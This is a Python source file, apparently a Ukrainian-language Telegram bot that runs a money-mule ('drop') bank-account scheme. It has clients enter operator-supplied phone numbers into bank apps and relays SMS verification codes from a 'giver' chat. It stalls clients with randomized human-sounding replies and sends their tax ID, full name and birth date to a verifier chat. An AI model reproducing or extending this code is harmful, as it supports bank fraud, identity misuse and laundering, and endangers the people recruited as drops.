    sent_codes_count = session.get('sent_codes_count', 0)
    
    if sent_codes_count == 0 and not is_retry:
        first_phrases = [
            "Хвилинку, очікую поки він мені надійде",
            "Хвилинку, зараз очікую поки прийде",
            "Секунду, чекаю поки прийде код",
            "Зараз, чекаю поки надійде код"
        ]
        msg_text = random.choice(first_phrases)
    else:
        subsequent_phrases = [
            "Хвилину",
            "Секунду",
            "сек",
            "щас, чекаю",
            "хв, чекаю",
            "зараз, очікую",
            "чекаю",
            "хвилинку",
            "секунду, чекаю",
            "щас, сек"
        ]
        msg_text = random.choice(subsequent_phrases)
        
    await notify_fn(msg_text, is_error=False, is_retry=is_retry)

    if is_retry:
        try:
            giver_msg = giver_retry_format.format(line_id=line_num, bank_name=bank_name)
        except Exception:
            giver_msg = f"Запрос {line_num} {bank_name} (ПОВТОРНО)"
    else:
        try:
            giver_msg = giver_format.format(line_id=line_num, bank_name=bank_name)
        except Exception:
            giver_msg = f"Запрос {line_num} {bank_name}"

    # Надсилаємо запит постачальнику кодів (Giver)
    from bot.config import get_giver_chat_id, get_admin_id
    try:
        await bot.send_message(chat_id=get_giver_chat_id(), text=giver_msg)
    except Exception as e:
        # Якщо не вдалося надіслати гіверу, повідомляємо адміна
        await bot.send_message(
            chat_id=get_admin_id(),
            text=f"Помилка надсилання запиту гіверу (Line {line_num}): {str(e)}"
        )
    return True

@router.callback_query(F.data == "request_code")
async def process_request_code(callback: CallbackQuery, bot: Bot, state: FSMContext):
    """Обробник натискання кнопки 'Запросити SMS-код' клієнтом"""
    client_id = callback.from_user.id
    
    async def notify(msg: str, is_error: bool = False, is_retry: bool = False):
        if is_error:
            await callback.answer(msg, show_alert=True)
        else:
            await callback.message.answer(msg, reply_markup=get_sms_request_keyboard())
            await callback.answer("Запит відправлено!")
            
    await trigger_sms_code_request(client_id, bot, state, notify)

@router.callback_query(F.data == "wrongcode_yes")
async def handle_wrongcode_yes(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_reply_markup(reply_markup=None)
    
    client_kbd = get_sms_request_keyboard()
    
    await callback.message.answer(
        "Запросіть новий SMS-код у додатку банку. Як тільки зробите це — напишіть мені «новий код» або «потрібен код».",
        parse_mode="Markdown",
        reply_markup=client_kbd
    )
    await callback.answer()

@router.callback_query(F.data == "wrongcode_no")
async def handle_wrongcode_no(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.answer("Добре! Продовжуйте реєстрацію.")
    await callback.answer()

@router.message(RegistrationStates.waiting_wrong_code_confirm, F.chat.type == "private")
async def process_wrong_code_confirm_text(message: Message, state: FSMContext):
    t = message.text.lower().strip()
    yes_words = ["так", "yes", "да", "дп", "ага", "угу", "треба", "потрібен", "новий", "давай", "так потрібен"]
    no_words = ["ні", "no", "нет", "все добре", "все нормально", "все ок", "ок", "не треба", "ні все добре"]
    
    is_yes = False
    is_no = False
    
    for w in yes_words:
        if w in t:
            is_yes = True
            break
            
    for w in no_words:
        if w in t:
            is_no = True
            break
            
    if is_yes:
        await state.clear()
        client_kbd = get_sms_request_keyboard()
        await message.answer(
            "Запросіть новий SMS-код у додатку банку. Як тільки зробите це — напишіть мені «новий код» або «потрібен код».",
            parse_mode="Markdown",
            reply_markup=client_kbd
        )
    elif is_no:
        await state.clear()
        await message.answer("Добре! Продовжуйте реєстрацію.")
    else:
        await message.answer(
            "Будь ласка, оберіть відповідь на кнопках нижче або напишіть 'так' чи 'ні':"
        )

@router.message(RegistrationStates.waiting_own_number_confirm, F.chat.type == "private")
async def process_own_number_confirm(message: Message, state: FSMContext, bot: Bot):
    t = (message.text or "").lower().strip()
    affirmative_words = [
        "так", "ага", "угу", "да", "дп", "конечно", "звісно", "саме так", 
        "своїм", "на свій", "на свой", "свой", "свій", "да, на свой", "так, на свій"
    ]
    is_affirmative = False
    for word in affirmative_words:
        if word in t:
            is_affirmative = True
            break
            
    if is_affirmative:
        await mark_bank_as_failed(message.from_user.id, bot)
        await state.clear()
    else:
        await message.answer("Добре. Тоді, будь ласка, спробуйте ще раз ввести в додатку номер, який я вам надіслав. Коли додаток попросить код підтвердження — напишіть про це сюди.")
        await state.clear()


@router.message(RegistrationStates.waiting_amobank_instruction_confirm, F.chat.type == "private")
async def process_amobank_instruction_confirm(message: Message, state: FSMContext, bot: Bot):
    t = (message.text or "").lower().strip()
    affirmative_words = ["так", "давай", "надсилай", "кидай", "ок", "окей", "да", "скинь", "скидуй", "звісно", "ага", "угу", "хочу"]
    
    is_yes = any(word in t for word in affirmative_words)
    
    if is_yes:
        await state.clear()
        await message.answer("Ось детальний шаблон заповнення анкети для AmoBank:")
        
        from aiogram.types import InputMediaPhoto, FSInputFile
        import os
        
        images_dir = os.path.join(os.path.dirname(__file__), "..", "resources", "images")
        media = []
        for i in range(1, 5):
            img_path = os.path.join(images_dir, f"amobank_step{i}.png")
            if os.path.exists(img_path):
                media.append(InputMediaPhoto(media=FSInputFile(img_path)))
        
        if media:
            try:
                await bot.send_media_group(chat_id=message.chat.id, media=media)
            except Exception as e:
                logger.error(f"Error sending amobank screenshots: {e}")
                await message.answer("Не вдалося надіслати зображення через технічну помилку.")
        else:
            await message.answer("Зображення шаблону не знайдено.")
    else:
        # Clear state and process the message normally via handle_client_data_manual
        await state.clear()
        await handle_client_data_manual(message, state, bot)


@router.message(RegistrationStates.waiting_lviv_success_confirm, F.chat.type == "private")
async def process_lviv_success_confirm(message: Message, state: FSMContext, bot: Bot):
    t = (message.text or "").lower().strip()
    affirmative_words = ["так", "давай", "ок", "окей", "да", "звісно", "ага", "угу", "хочу"]
    is_yes = any(word in t for word in affirmative_words)
    
    if is_yes:
        # Retrieve template photo file_id we saved earlier
        data = await state.get_data()
        success_photo_id = data.get("lviv_template_photo_id")
        
        # Save it into FSM data under success_photo_id so continue_after_phone can access it
        await state.update_data(success_photo_id=success_photo_id)
        
        # Update in database as well
        await db.update_session_verification_data(
            message.from_user.id,
            success_photo_id=success_photo_id
        )
        
        session = await db.get_session(message.from_user.id)
        if session and session.get('client_phone'):
            # Якщо є збережений телефон, відразу продовжуємо
            await continue_after_phone(message, state, bot, message.from_user.id)
        else:
            await message.answer(
                "Будь ласка, напишіть Ваш номер телефону?",
                reply_markup=ReplyKeyboardRemove()
            )
            await state.set_state(RegistrationStates.waiting_phone)
    else:
        await state.clear()
        await handle_client_data_manual(message, state, bot)


async def send_anketa_to_verifier(client_id: int, bot: Bot) -> int | None:
    """Надсилання анкети у чат верифікаторів"""
    import re
    from bot.config import get_anketa_chat_id, get_admin_id
    
    session = await db.get_session(client_id)
    if not session:
        logger.error(f"Не знайдено сесію для надсилання анкети клієнта {client_id}")
        return None
        
    username = session.get('username') or "Невідомий"
    client_data = session.get('client_data', '')
    
    # Розпарсимо PIB, DOB, IPN
    ipn_match = re.search(r'ІПН:\s*(\d+)', client_data)
    pib_match = re.search(r'ПІБ:\s*(.+)', client_data)
    dob_match = re.search(r'Дата:\s*(.+)', client_data)
    
    ipn = ipn_match.group(1) if ipn_match else "Невідомо"
    pib = pib_match.group(1) if pib_match else "Невідомо"
    dob = dob_match.group(1) if dob_match else "Невідомо"
    
    # Форматування списку банків
    selected_banks_str = session.get('selected_banks', '')
    banks_list = [b.strip() for b in selected_banks_str.split(',') if b.strip()]
    formatted_banks = " | ".join(banks_list) if banks_list else "Не обрано"
    
    drop_line = f"Дроп - @{username}" if username and username != "Немає юзернейму" else "Дроп - Без юзернейму"
    
    anketa_text = (
        f"ІПН: {ipn}\n"
        f"ПІБ: {pib}\n"
        f"Дата: {dob}\n\n"
        f"{drop_line}\n\n"
        f"{formatted_banks}"
    )
    
    anketa_chat_id = get_anketa_chat_id()
    admin_id = get_admin_id()
    if not anketa_chat_id:
        # Автоматично схвалюємо, якщо верифікатор не налаштований
        await db.set_session_verified(client_id, 1)
        await db.update_session_status(client_id, 'registered')
        try:
            await bot.send_message(
                chat_id=admin_id,
                text=f"⚠️ <b>ANKETA_CHAT_ID не налаштовано!</b>\nАнкету клієнта @{username} (ID: {client_id}) схвалено автоматично.",
                parse_mode="HTML"
            )
        except Exception:
            pass
        return None
        
    try:
        sent_msg = await bot.send_message(chat_id=anketa_chat_id, text=anketa_text)
        await db.update_session_verifier_message_id(client_id, sent_msg.message_id)
        return sent_msg.message_id
    except Exception as e:
        logger.error(f"Помилка відправки анкети в чат верифікаторів: {e}")
        try:
            await bot.send_message(
                chat_id=admin_id,
                text=f"Помилка відправки анкети в чат верифікаторів: {e}\n\nАнкета:\n{anketa_text}"
            )
        except Exception:
            pass
        return None



